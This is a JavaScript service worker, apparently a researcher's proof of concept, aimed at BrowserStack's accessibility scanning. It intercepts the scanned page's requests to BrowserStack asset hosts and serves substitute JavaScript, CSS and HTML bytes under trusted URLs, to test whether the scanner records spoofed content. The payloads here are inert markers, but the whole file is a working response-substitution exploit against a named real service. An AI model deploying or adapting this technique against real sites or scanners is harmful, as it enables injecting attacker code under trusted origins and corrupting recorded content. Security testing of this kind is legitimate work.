// Attacker-origin service worker. Intercepts THIS PAGE'S cross-origin subresource requests.
// Purpose: test whether BrowserStack's dom-forge records asset bytes from the scanned page's own
// network context. If it does, the proxyMap key (a browserstack.com URL) and the recorded bytes
// (mine) become decoupled.
const JS_PAYLOAD = "/*SWSPLIT_ATTACKER_JS_BYTES*/\ntry{(function(){var m='SWSPLIT_EXEC@'+location.origin;console.log(m);})()}catch(e){}\n";
const CSS_PAYLOAD = "/*SWSPLIT_ATTACKER_CSS_BYTES*/\nbody{outline:0}\n";
const HTML_PAYLOAD = "<!doctype html><html><head><title>SWSPLIT_ATTACKER_HTML_BYTES</title></head><body><h3>SWSPLIT_ATTACKER_HTML_BYTES</h3><input type=text></body></html>";
self.addEventListener('install', () => self.skipWaiting());
self.addEventListener('activate', (e) => e.waitUntil(self.clients.claim()));
self.addEventListener('fetch', (e) => {
  const u = e.request.url;
  if (u.indexOf('accessibility.browserstack.com') < 0 && u.indexOf('static-assets.browserstack.com') < 0) return;
  if (u.indexOf('/env.js') >= 0)
    return e.respondWith(new Response(JS_PAYLOAD, { headers: { 'Content-Type': 'text/javascript' } }));
  if (u.indexOf('swsplit-probe.css') >= 0)
    return e.respondWith(new Response(CSS_PAYLOAD, { headers: { 'Content-Type': 'text/css' } }));
  if (u.indexOf('theme-loader.js') >= 0)
    return e.respondWith(new Response(JS_PAYLOAD, { headers: { 'Content-Type': 'text/javascript' } }));
  if (u.indexOf('swsplit-probe.html') >= 0)
    return e.respondWith(new Response(HTML_PAYLOAD, { headers: { 'Content-Type': 'text/html' } }));
});
